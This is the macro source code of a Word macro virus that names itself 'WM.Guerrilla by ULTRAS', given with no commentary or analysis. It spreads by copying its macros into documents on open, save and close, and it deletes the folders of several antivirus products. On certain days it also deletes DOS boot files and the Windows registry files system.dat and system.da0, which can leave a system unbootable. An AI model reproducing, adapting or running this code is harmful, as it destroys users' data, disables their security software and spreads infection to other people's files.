   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "??????, ????????, ???????? ??? ????????? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   On Error Resume Next
   WordBasic.Call "Guerrilla.TM"
   WordBasic.Call "KillAV"
   End Sub

   Attribute VB_Name = "FileSaveAS"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.Call "Guerrilla.FSA"
   End Sub

   Attribute VB_Name = "Guerrilla"

   Dim fn$
   Public Sub MAIN()
   fn$ = ""
   Rem WM.Guerrilla
   Rem ULTRAS "ultras2@usa.net"
   End Sub
   Private Sub INF()
   On Error GoTo -1: On Error GoTo IA
   WordBasic.DisableInput 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, RecommendReadOnly:=0
   fn$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy "Global:AutoExec", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:AutoExit", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoClose", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoOpen", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:FileSaveAs", fn$ + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:FileSave", fn$ + ":FileSave", 1
   WordBasic.MacroCopy "Global:FileClose", fn$ + ":FileClose", 1
   WordBasic.MacroCopy "Global:ToolsMacro", fn$ + ":ToolsMacro", 1
   WordBasic.MacroCopy "Global:FileTemplates", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:ToolsCustomize", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:KillAV", fn$ + ":KillAV", 1
   WordBasic.MacroCopy "Global:ULTRAS", fn$ + ":ULTRAS", 1
   WordBasic.MacroCopy "Global:Timer", fn$ + ":Timer", 1
   IA:
   End Sub
   Private Sub FS()
   On Error GoTo -1: On Error GoTo IB
   WordBasic.DisableInput 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, RecommendReadOnly:=0
   WordBasic.DisableAutoMacros 0
   WordBasic.SetDocumentDirty
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAS(False)
   WordBasic.CurValues.FileSaveAS dlg
   dlg.Format = 1
   WordBasic.FileSaveAS dlg
   fn$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy "Global:AutoExec", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:AutoExit", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoClose", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoOpen", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:FileSaveAs", fn$ + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:FileSave", fn$ + ":FileSave", 1
   WordBasic.MacroCopy "Global:FileClose", fn$ + ":FileClose", 1
   WordBasic.MacroCopy "Global:ToolsMacro", fn$ + ":ToolsMacro", 1
   WordBasic.MacroCopy "Global:FileTemplates", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:ToolsCustomize", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:KillAV", fn$ + ":KillAV", 1
   WordBasic.MacroCopy "Global:ULTRAS", fn$ + ":ULTRAS", 1
   WordBasic.MacroCopy "Global:Timer", fn$ + ":Timer", 1
   WordBasic.FileSave
   Err.Number = 102
   IB:
   If Err.Number <> 102 Then
    WordBasic.FileSave
   End If
   End Sub
   Private Sub FSA()
   On Error GoTo -1: On Error GoTo IC
   WordBasic.DisableInput 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, RecommendReadOnly:=0
   WordBasic.DisableAutoMacros 0
   WordBasic.SetDocumentDirty
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAS(False)
   WordBasic.CurValues.FileSaveAS dlg
   WordBasic.Dialog.FileSaveAS dlg
   dlg.Format = 1
   fn$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy "Global:AutoExec", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:AutoExit", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoClose", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:AutoOpen", fn$ + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:FileSaveAs", fn$ + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:FileSave", fn$ + ":FileSave", 1
   WordBasic.MacroCopy "Global:FileClose", fn$ + ":FileClose", 1
   WordBasic.MacroCopy "Global:ToolsMacro", fn$ + ":ToolsMacro", 1
   WordBasic.MacroCopy "Global:FileTemplates", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:ToolsCustomize", fn$ + ":AutoExec", 1
   WordBasic.MacroCopy "Global:KillAV", fn$ + ":KillAV", 1
   WordBasic.MacroCopy "Global:ULTRAS", fn$ + ":ULTRAS", 1
   WordBasic.MacroCopy "Global:Timer", fn$ + ":Timer", 1
   WordBasic.FileSaveAS dlg
   Err.Number = 102
   IC:
   If Err.Number <> 102 Then
    WordBasic.FileSaveAS dlg
   End If
   End Sub
   Private Sub TM()
   On Error GoTo -1: On Error GoTo ID
   WordBasic.ScreenUpdating
   WordBasic.FileNew
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.FileClose 2
   WordBasic.ScreenUpdating
   WordBasic.ToolsMacro dlg
   ID:
   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "???????? ???? ???? ????????? ?????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   On Error Resume Next
   WordBasic.Call "Guerrilla.INF"
   WordBasic.FileClose
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "?????????? ????????? ????????? ??? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   On Error Resume Next
   WordBasic.Call "Guerrilla.FS"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.Call "Guerrilla.INF"
   WordBasic.Call "KillAV"
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   WordBasic.DisableAutoMacros
   End Sub

   Attribute VB_Name = "ULTRAS"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.ToolsOptionsUserInfo Name:="ULTRAS", Initials:="Guerrilla", Address:="ULTRAS2@usa.net"
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner", "ULTRAS", ""
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization", "Guerrilla", ""
       WordBasic.SetPrivateProfileString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductName", "WM.Guerrilla by ULTRAS", ""
   WordBasic.Call "Guerrilla"
   End Sub

   Attribute VB_Name = "KillAV"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
   WordBasic.Kill "C:\Program Files\Command Software\F-PROT95\*.*"
   WordBasic.Kill "C:\Program Files\McAfee\VirusScan\*.*"
   WordBasic.Kill "C:\Program Files\Norton AntiVirus\*.*"
   WordBasic.Kill "C:\Program Files\FindVirus\*.*"
   WordBasic.Kill "C:\f-macro\*.*"
   WordBasic.Kill "C:\Tbavw95\*.*"
   WordBasic.Call "Guerrilla"
   End Sub

   Attribute VB_Name = "Timer_"

   Public Sub MAIN()
   On Error Resume Next
   If WordBasic.Day(WordBasic.Now()) = 5 Then
   WordBasic.MsgBox "You Infected WM.Guerrilla by ULTRAS", "ULTRAS"
   WordBasic.Call "Dlg.Password" = "ULTRAS"
   End If
   If WordBasic.Day(WordBasic.Now()) = 17 Then
   WordBasic.MsgBox "You Infected WM.Guerrilla by ULTRAS", "ULTRAS"
   WordBasic.Kill "c:\Autoexec.bat"
   WordBasic.Kill "c:\Command.com"
   WordBasic.Kill "c:\Config.sys"
   End If
   If WordBasic.Day(WordBasic.Now()) = 25 Then
   WordBasic.MsgBox "You Infected WM.Guerrilla by ULTRAS", "ULTRAS"
   SetAttr "c:\windows\system.dat", 0
   SetAttr "c:\windows\system.da0", 0
   WordBasic.Kill "c:\windows\system.dat"
   WordBasic.Kill "c:\windows\system.da0"
   End If
   End Sub
